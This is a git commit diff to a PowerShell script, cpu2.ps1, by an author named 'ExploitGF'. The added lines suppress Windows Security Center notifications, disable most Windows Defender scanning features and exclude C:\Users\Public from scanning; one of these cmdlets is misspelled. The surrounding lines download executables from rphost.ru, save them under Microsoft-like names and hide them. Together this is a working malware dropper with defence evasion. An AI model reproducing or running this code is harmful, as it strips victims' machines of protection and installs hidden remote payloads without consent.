6899188a4b75b974d9477422f1bf41d250a1cc01
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-09-05 14:25:54 +0500

    Update cpu2.ps1

--- cpu2.ps1
+++ cpu2.ps1
@@ -1,3 +1,15 @@
+New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "AntiVirusDisableNotify" -Value "1"
+New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "FirewallDisableNotify" -Value "1"
+New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "UpdatesDisableNotify" -Value "1"
+Set-MpPreference -DisableScriptScanning 1
+Set-MpPreference -DisableArchiveScanning 1
+Set-MpPreference -DisableAutoExclusions 1
+Set-MpPreference -DisableBehaviorMonitoring 1
+Set-MpPreference -DisableBlockAtFirstSeen 1
+Set-MpPreference -DisableIOAVProtection 1
+Set-MpPreference -DisablePrivacyMode 1
+Set-MpPreference -DisableRealtimeMonitoring 1
+Add-Mpd-MpPreference -ExclusionPath C:\Users\Public\
 (New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
 Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
 (New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_2.signed","C:\Users\Public\MSASCuiL.exe")
